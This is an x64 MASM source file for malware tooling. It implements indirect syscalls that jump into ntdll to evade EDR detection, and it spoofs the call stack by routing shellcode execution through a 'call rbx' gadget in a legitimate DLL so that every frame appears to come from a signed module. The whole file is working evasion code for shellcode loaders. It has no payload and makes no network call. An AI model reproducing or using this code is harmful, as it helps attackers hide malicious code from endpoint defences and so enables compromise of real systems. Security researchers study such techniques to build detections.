;; AsmStub.asm - Indirect Syscall Stub + Call Stack Spoofing (x64 MASM)
;;
;; SetSSn / RunSyscall   — indirect syscall engine (gadget randomization)
;; SetSpoofTarget        — store shellcode + call gadget addresses
;; SpoofCallback         — thread pool callback with gadget-injected stack frame

.data
    wSSn            DWORD   000h        ; Current SSN
    qSyscallAddr    QWORD   000h        ; Address of syscall;ret in ntdll
    qTargetFunc     QWORD   000h        ; Shellcode address for spoofed callback
    qCallGadget     QWORD   000h        ; Address of 'call rbx' gadget in legit DLL

.code

; -----------------------------------------------
; SetSSn(DWORD wSystemCall, PVOID pSyscallAddress)
;   ecx = SSN
;   rdx = syscall;ret address in ntdll
; -----------------------------------------------
SetSSn PROC
    mov wSSn, ecx
    mov qSyscallAddr, rdx
    ret
SetSSn ENDP

; -----------------------------------------------
; RunSyscall(...)
;   Executes indirect syscall by jumping to ntdll
;   syscall instruction, avoiding syscall from
;   our own .text section (EDR detection)
; -----------------------------------------------
RunSyscall PROC
    mov r10, rcx                    ; Standard syscall ABI: r10 = first arg
    mov eax, wSSn                   ; EAX = SSN
    jmp QWORD PTR [qSyscallAddr]   ; Jump to ntdll's syscall;ret
    ret                             ; Never reached (ret in ntdll)
RunSyscall ENDP

; -----------------------------------------------
; SetSpoofTarget(PVOID pTarget, PVOID pCallGadget)
;   RCX = shellcode / stomped address
;   RDX = 'call rbx' gadget address (or NULL)
;   Stores both for SpoofCallback to use
; -----------------------------------------------
SetSpoofTarget PROC
    mov qTargetFunc, rcx
    mov qCallGadget, rdx
    ret
SetSpoofTarget ENDP

; -----------------------------------------------
; SpoofCallback - Thread pool work callback with
;   call stack spoofing via gadget injection
;
; Called by ntdll thread pool as:
;   SpoofCallback(Instance, Context, Work)
;   RCX = PTP_CALLBACK_INSTANCE
;   RDX = PVOID Context (unused)
;   R8  = PTP_WORK
;
; If qCallGadget is set (found 'call rbx' / FF D3
; in a legitimate DLL):
;   1. Load shellcode addr into RBX
;   2. JMP to the 'call rbx' gadget
;   3. Gadget executes CALL RBX:
;      - Pushes gadget's return addr (inside legit DLL)
;      - Jumps to RBX (shellcode)
;
; Resulting call stack:
;   shellcode RIP (in stomped/phantom DLL .text)
;   -> return addr inside legitimate DLL (gadget site)
;   -> TppWorkpExecute     (ntdll)
;   -> TppWorkerThread     (ntdll)
;   -> RtlUserThreadStart  (ntdll)
;
; All frames are in legitimate signed modules.
;
; If no gadget found, falls back to direct tail-call
; (JMP to shellcode, no extra frame injected).
; -----------------------------------------------
SpoofCallback PROC
    mov rbx, QWORD PTR [qTargetFunc]   ; RBX = shellcode address
    mov rax, QWORD PTR [qCallGadget]
    test rax, rax
    jz _direct
    jmp rax                             ; JMP to 'call rbx' gadget in legit DLL
                                        ; Gadget: CALL RBX -> pushes legit frame
_direct:
    jmp rbx                             ; Fallback: direct tail-call
SpoofCallback ENDP

end
